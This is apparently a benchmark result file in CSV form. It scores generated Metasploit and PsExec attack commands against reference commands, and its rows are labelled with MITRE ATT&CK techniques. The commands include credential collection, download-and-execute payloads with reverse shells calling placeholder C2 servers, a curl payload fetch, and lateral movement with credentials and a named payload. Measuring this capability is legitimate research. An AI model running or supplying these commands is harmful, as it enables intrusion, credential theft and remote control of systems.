file,tool,input_command,matched_command,chrf_score,match_found
command_metasploit_TA0002_T1059.txt,metasploit,powershell.exe -ExecutionPolicy Bypass -File <script_file_path>,"`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`",24.725,True
command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -InputFormat None -Command ""Start-Process -FilePath <program_to_execute> -ArgumentList @('<arg1>', '<arg2>')""","`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`",24.359,True
command_metasploit_TA0002_T1059.txt,metasploit,powershell.exe -File <script_file_path> -WindowStyle Hidden,"`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`",23.278,True
command_metasploit_TA0002_T1059.txt,metasploit,"powershell.exe -InputFormat None -Command ""Start-Process -FilePath <script_to_execute> -ArgumentList @('<arg1>', '<arg2>')""","`meterpreter > powershell_execute ""Find-LocalAdminAccess | Out-File C:\\Users\\<domain_admin>.<domain>\\AppData\\Roaming\\TransbaseOdbcDriver\\admin.txt""`",24.381,True
command_metasploit_TA0010_T1041.txt,metasploit,recon/wlan scan_interfaces,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,16.041,True
command_metasploit_TA0010_T1041.txt,metasploit,recon/gather/credentials collect_creds,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,57.01,True
command_metasploit_TA0010_T1041.txt,metasploit,escalate/exploit exfil_data <C2_IP> <C2_Port>,"    ```
    set CMD ""reg.exe delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Java-Update /f""
    exploit
    ```",18.818,True
command_metasploit_TA0011_T1071.txt,metasploit,msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_http; set RHOST <c2_server_ip>; set RPORT 8080; exploit',"```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```",45.662,True
command_metasploit_TA0011_T1071.txt,metasploit,msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_https; set RHOST <c2_server_ip>; set RPORT 8443; set SSL true; exploit',"```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```",43.066,True
command_metasploit_TA0011_T1071.txt,metasploit,msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_tcp; set RHOST <c2_server_ip>; set RPORT 80; set HTTP true; exploit',"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```",41.407,True
command_metasploit_TA0011_T1071.txt,metasploit,msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_tcp; set RHOST <c2_server_ip>; set RPORT 443; set SSL true; set HTTP false; exploit',"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```",39.333,True
command_metasploit_TA0011_T1102.txt,metasploit,curl -o <served_payload_file> https://<c2_server>/linux/x64/meterpreter/reverse_tcp,"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```",40.354,True
command_psexec_TA0002_T1569.txt,psexec,"psexec -s -a 1,2 -c ""C:\Path\To\MaliciousExecutable.exe"" -d","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",20.182,True
command_psexec_TA0002_T1569.txt,psexec,"psexec -s -a 1,2 -c ""C:\Path\To\MaliciousExecutable.exe"" -h","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",19.952,True
command_psexec_TA0002_T1569.txt,psexec,"psexec -s -a 1,2 -c ""C:\Path\To\MaliciousExecutable.exe"" -l","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",20.182,True
command_psexec_TA0008_T1021.txt,psexec,psexec \\<target_computer_name> -s -i cmd.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",19.539,True
command_psexec_TA0008_T1021.txt,psexec,psexec \\<target_computer_name> -u <username> -p <password> cmd.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",25.646,True
command_psexec_TA0008_T1021.txt,psexec,psexec \\<target_computer_name> -r <remote_service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",19.666,True
command_psexec_TA0008_T1021.txt,psexec,psexec \\<target_computer_name> -l -i cmd.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",19.539,True
command_psexec_TA0008_T1021.txt,psexec,psexec \\<target_computer_name> -h -i cmd.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",19.539,True
